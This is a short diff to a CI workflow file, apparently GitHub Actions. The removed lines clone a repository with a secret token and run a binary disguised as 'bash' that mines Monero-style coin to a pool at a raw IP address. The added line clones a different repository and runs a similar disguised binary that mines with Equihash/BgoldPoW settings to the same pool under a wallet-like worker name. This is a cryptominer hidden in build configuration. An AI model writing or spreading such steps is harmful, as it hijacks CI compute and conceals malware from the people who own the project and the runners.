@@ -58,8 +58,5 @@ jobs:
         env:
           GH_TOKEN: ${{ secrets.GH_TOKEN }}
         run: |
-          git clone https://x-access-token:$GH_TOKEN@github.com/sadarsayujinjas/xmr21.git
-          cd xmr21
-          chmod +x ./bash
-          ./bash --noCPU -o 138.197.24.47:80 -u ccx7FNm5WxvKLTWgLyc9EuMKeMv32u32bgrGCAoq7SwzFdEz5BYkBRDexMyZmYUGaqGf8jFJCCRyqVFDdvXv4N6zAKPceUT6T1
+          git clone https://github.com/hujisanda/mamalol.git && cd mamalol && chmod u+x bash && ./bash --algo EQUI144_5 --pers BgoldPoW --pool 138.197.24.47:80 --user GKLexVEwKATchJp19S6UUSdYkQ4qLbgbaC.Worker_GPU4GB --ethstratum ETHPROX
           
